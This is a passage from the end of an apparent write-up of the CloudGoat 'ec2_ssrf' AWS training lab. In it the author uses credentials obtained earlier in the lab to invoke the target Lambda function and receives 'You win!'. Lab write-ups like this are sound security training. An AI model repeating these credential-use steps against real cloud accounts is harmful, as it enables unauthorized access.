    "Arn": "arn:aws:iam::388*****5333:user/shepard-cgid28wbprioii"
}
```

So I have a new account, and I’ve been instructed to invoke that Lambda function from way back when. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws lambda invoke --function-name cg-lambda-cgid28wbprioii  --payload '{}' output.txt --profile admin
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
                                                                                          
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ cat output.txt
"You win!"             
```

Done! That was a really good lab.